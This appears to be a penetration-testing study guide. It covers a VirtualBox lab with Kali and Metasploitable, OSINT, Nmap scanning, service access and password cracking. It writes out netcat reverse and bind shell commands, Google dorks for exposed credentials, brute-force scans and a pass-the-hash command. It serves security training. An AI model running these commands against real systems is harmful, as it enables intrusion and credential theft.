🖥️ Virtual Lab Infrastructure

VirtualBox Hypervisor Setup

VirtualBox is a Type-2 hypervisor that creates isolated virtual machines for safe penetration testing practice.

BIOS/UEFI Prerequisites

Enable Intel VT-x or AMD-V hardware virtualization extensions. Without these, 64-bit VMs and nested virtualization will fail.

Installation Sequence:

  1. Download the platform binary from virtualbox.org
  2. Run the executable with Administrator privileges
  3. Enable Virtualization Support (VT-x/AMD-V) in your hardware BIOS
  4. Complete installation setup
VirtualBox

🐱 Kali Linux - Penetration Testing OS

Kali Linux is a Debian-based distribution with 600+ pre-installed penetration testing tools including Nmap, Wireshark, Metasploit, and Burp Suite.

VM Resource Allocation

RAM: 2048MB minimum (4096MB recommended) | CPU: 2 Cores minimum | Disk: 25GB dynamically allocated

Import Procedure:

  1. Download the pre-built 64-bit VirtualBox (.vbox) image
  2. Open VirtualBox → File → Import Appliance
  3. Allocate a minimum of 2048MB RAM and 2 Processor Cores
  4. Select "Copy machine ID"
  5. Click Import
Kali Linux

🎯 Metasploitable - Vulnerable Target VM

Metasploitable is an intentionally vulnerable Linux VM containing exploitable services including vsftpd 2.3.4 backdoor, Tomcat manager, and weak SSH credentials.

Configuration Steps:

  1. Extract the downloaded zip file
  2. Open VirtualBox → Click "New"
  3. Name it 'Metasploitable' → Select Linux/Ubuntu 64-bit
  4. Choose "Use an existing virtual hard disk file"
  5. Browse and select the extracted .vmdk file
  6. Click Create
Metasploitable

Phase 1

Reconnaissance & OSINT

Passive and active intelligence gathering techniques to map the target's digital footprint before engagement.

👁️ Passive Reconnaissance (No Direct Contact)

WHOIS Protocol

WHOIS queries the regional Internet registry (RIR) databases to retrieve domain registration information including registrant name, email, phone, nameservers, and registration/expiry dates.

whois example.com # Returns: Registrar, Creation Date, Expiry Date, Nameservers, Registrant Contact
WHOIS

DNS Enumeration - nslookup

nslookup queries DNS servers to resolve hostnames to IP addresses and discover mail servers (MX records), nameservers (NS records), and other DNS resource records.

nslookup -type=mx example.com # Returns mail exchange servers nslookup -type=ns example.com # Returns authoritative nameservers nslookup -type=any example.com # Returns all available DNS records
nslookup

Reverse IP Lookup

Reverse IP lookup identifies all domains hosted on a specific IP address, revealing shared hosting environments and potentially related targets.

Reverse IP Lookup

Wappalyzer - Technology Fingerprinting

Wappalyzer is a browser extension that identifies the technology stack of websites including CMS (WordPress, Drupal), web servers (Apache, Nginx), analytics tools, JavaScript frameworks, and programming languages.

Wappalyzer

Wayback Machine - Historical Analysis

The Wayback Machine (archive.org) stores historical snapshots of websites. Useful for finding deleted pages, old credentials, exposed directories, and changed content that may reveal vulnerabilities.

Wayback Machine

HTTrack - Website Cloning

HTTrack downloads entire websites for offline browsing and analysis. Creates a local mirror including HTML, images, and linked resources for thorough examination without generating additional traffic.

httrack https://target.com -O /tmp/mirror # Creates complete offline mirror of target website
HTTrack

🔍 Active Reconnaissance (Direct Interaction)

GHDB - Google Hacking Database

GHDB is a repository of advanced Google dorks (search queries) designed to find vulnerable systems, exposed documents, login pages, and sensitive information indexed by Google.

# Common GHDB Dorks: site:target.com ext:php inurl:id= # SQL injection targets site:target.com intitle:"index of" # Directory listing exposure site:target.com ext:log # Exposed log files site:target.com inurl:admin # Admin panel discovery filetype:env "DB_PASSWORD" # Exposed environment files
GHDB

CVE - Common Vulnerabilities and Exposures

CVE is a standardized dictionary of publicly known cybersecurity vulnerabilities. Each CVE entry has a unique ID (e.g., CVE-2021-44228 for Log4Shell) and is assigned a CVSS severity score.

CVE

Exploit-DB

Exploit-DB is a repository of public exploits and vulnerable software. Maintained by OffSec, it contains shellcode, papers, and proof-of-concept exploits searchable by CVE, platform, or application.

Exploit-DB

Maltego - Link Analysis & Visualization

Maltego is a powerful OSINT tool that visualizes relationships between entities (domains, IPs, emails, social media accounts, people). Uses "transforms" to query data sources and build interactive graphs showing the attack surface.

Scanning & Enumeration

📡 Host Discovery Tools

Ping - ICMP Host Discovery

Sends ICMP Echo Request packets to determine if a host is reachable. Firewalls often block ICMP, making this unreliable for stealth operations.

ping -c 4 10.0.2.5
Ping

Netdiscover - ARP Scanning

Discovers live hosts on local networks using ARP requests. More reliable than ICMP for LAN discovery since ARP cannot be blocked on the local segment.

netdiscover -r 10.0.2.0/24
Netdiscover

Angry IP Scanner

Fast, cross-platform IP scanner that uses ICMP, TCP, and UDP probes. Provides GUI-based network mapping with export capabilities.

Angry IP Scanner

Advanced IP Scanner

Windows-native network scanner with RDP and SSH integration. Scans IP ranges and provides one-click remote access to discovered hosts.

Advanced IP Scanner

🔍 Nmap - Network Mapper

TCP SYN Half-Open Scanning

TCP SYN scan (-sS) sends a SYN packet and analyzes the response without completing the TCP three-way handshake. SYN-ACK indicates open port; RST indicates closed. This technique is stealthy as the connection is never fully established.

nmap -sS 10.0.2.5 # SYN scan - half-open, stealthy

OS Fingerprinting via TTL Analysis

Nmap identifies operating systems by analyzing TCP/IP stack behaviors including TTL (Time To Live) values, TCP window sizes, and IP ID sequences. Linux typically uses TTL 64; Windows uses TTL 128.

nmap -O 10.0.2.5 # OS detection via TCP/IP fingerprinting nmap -O --osscan-guess 10.0.2.5 # Aggressive OS guessing

Nmap NSE Script Categories

Nmap Scripting Engine (NSE) extends Nmap with Lua scripts for advanced discovery, vulnerability detection, and exploitation. Scripts are categorized by purpose and risk level.

🔐 auth

Bypass authentication and extract credentials from services.

💥 brute

Brute force authentication on various services (SSH, FTP, HTTP).

🔎 discovery

Network discovery and topology mapping scripts.

⚠️ vuln

Vulnerability detection scripts (CVE checks, misconfigurations).

✅ safe

Non-intrusive scripts that won't crash services.

☢️ intrusive

Scripts that may crash services or generate significant traffic.

🔓 exploit

Active exploitation scripts for known vulnerabilities.

🦠 malware

Detect backdoors and malware infections on target systems.

nmap -sC -sV 10.0.2.5 # Default scripts + version detection nmap --script vuln 10.0.2.5 # Run all vulnerability detection scripts nmap --script brute 10.0.2.5 # Run brute force scripts

🖥️ Zenmap - Nmap GUI

Zenmap is the official graphical user interface for Nmap. It provides topology visualization showing how hosts are interconnected, pre-configured scan profiles for common scenarios, and interactive result exploration with filtering and comparison capabilities.

Zenmap

🔒 SSL/TLS Enumeration

SSL/TLS enumeration scripts identify certificate details, supported cipher suites, protocol versions, and vulnerabilities like Heartbleed, POODLE, and weak ciphers.

nmap --script ssl-enum-ciphers -p 443 target.com # Enumerate SSL cipher suites nmap --script ssl-heartbleed -p 443 target.com # Check for Heartbleed vulnerability

🌐 Service Protocol Exploitation

FTP (Port 20/21)

File Transfer Protocol often configured with anonymous login enabled. Vulnerable to bounce attacks and credential sniffing.

ftp 10.0.2.5 anonymous # Try anonymous login
FTP

SSH (Port 22)

Secure Shell for encrypted remote access. Target for brute force attacks and key-based authentication exploits.

ssh user@10.0.2.5 ssh -i key.pem user@10.0.2.5
SSH

Telnet (Port 23)

Insecure plaintext remote login protocol. All communications including passwords transmitted unencrypted.

telnet 10.0.2.5 23
Telnet

MySQL (Port 3306)

Database service vulnerable to brute force, SQL injection via applications, and misconfigured root access.

mysql -h 10.0.2.5 -u root -p
MySQL

SNMP (Port 161/162)

Simple Network Management Protocol with default community strings (public/private) exposes system information.

snmpwalk -c public -v1 10.0.2.5
SNMP

🐱 Netcat - The Network Swiss Army Knife

Netcat reads and writes data across network connections using TCP or UDP. It's used for banner grabbing, file transfer, port scanning, and establishing reverse/bind shells.

Banner Grabbing

nc -nv 10.0.2.5 80 GET / HTTP/1.1 Host: 10.0.2.5 # Returns server banner and HTTP response

Reverse Shell (Attacker → Victim)

# On attacker machine (listener): nc -lvnp 4444 # On victim machine (callback): nc -e /bin/bash 10.0.2.4 4444

Bind Shell (Victim → Attacker)

# On victim machine (listener): nc -lvnp 4444 -e /bin/bash # On attacker machine (connect): nc 10.0.2.5 4444
Netcat (nc)

🔓 Password Cracking & Hash Analysis

LM Hash - Cryptographic Deficiencies

LM (LAN Manager) hash is a legacy Windows password storage mechanism with critical weaknesses: passwords are converted to uppercase, split into two 7-character halves, and each half is encrypted with DES. This makes LM hashes trivially crackable.

LM Hash Weaknesses

• Passwords > 14 characters split into two 7-char halves

• All lowercase converted to uppercase (reduced keyspace)

• DES encryption with no salt

• Each half cracked independently

NTLM Hash - Improvements & Remaining Weaknesses

NTLM (NT LAN Manager) uses MD4 hashing instead of DES and doesn't split passwords. However, it lacks salt, making identical passwords produce identical hashes—enabling rainbow table attacks and pass-the-hash exploitation.

Ophcrack - Windows Password Recovery

Ophcrack is a Windows password cracking tool that uses rainbow tables for rapid LM and NTLM hash recovery. It boots from CD/USB and can crack most passwords in minutes.

Use Cases:

  • Password recovery from Windows SAM database
  • LM/NTLM hash cracking via rainbow tables
  • Password auditing for compliance assessments
Ophcrack

Rainbow Tables - Precomputed Hash Chains

Rainbow tables are precomputed chains of password hashes that trade storage space for computation time. Instead of computing hashes in real-time during cracking, the attacker looks up the target hash in the table to find the original password.

Rainbow Table Trade-offs

• Time-memory trade-off: Large storage requirements (GBs-TBs) but near-instant lookup

• Salting defeats rainbow tables: Unique salt per password requires separate tables

• Character set coverage: Tables must match target password complexity

Rainbow Tables

🔑 Pass-the-Hash Attacks

Pass-the-hash is a technique where an attacker captures the NTLM hash of a user's password and uses it to authenticate to other systems without ever knowing the plaintext password. This exploits the fact that Windows authentication can use hashes directly.

pth-winexe -U 'domain/admin%aad3b435b51404eeaad3b435b51404ee:HASH' //TARGET cmd # Authenticate using NTLM hash without plaintext password
